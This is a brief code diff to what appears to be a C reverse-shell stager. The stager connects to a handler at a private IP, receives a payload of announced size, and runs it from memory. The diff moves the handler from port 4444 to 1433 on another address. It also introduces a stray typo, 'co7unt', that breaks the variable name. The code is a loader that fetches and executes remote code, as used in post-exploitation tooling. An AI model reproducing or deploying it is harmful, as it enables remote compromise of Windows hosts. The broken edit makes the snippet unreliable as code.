@@ -226,7 +226,7 @@ int main(int argc, char* argv[])
 	winsock_init();
 
 	/* connect to the handler */
-	 my_socket = wsconnect("192.168.211.176", atoi("4444"));
+	 my_socket = wsconnect("192.168.190.52", atoi("1433"));
 	 	
 	int count = recv(my_socket, (char *)&size, 4, 0);
 	if (count != 4 || size <= 0)
@@ -246,9 +246,9 @@ int main(int argc, char* argv[])
 	memcpy(buffer + 1, &my_socket, 4);
 
 	/* read bytes into the buffer */
-	count = recv_all(my_socket, buffer + 5, size);
+	co7unt = recv_all(my_socket, buffer + 5, size);
 
-
+	//
 	//LoadFromFile();
 	printf("\n\n");
 	LoadFromMemory();//192.168.211.176
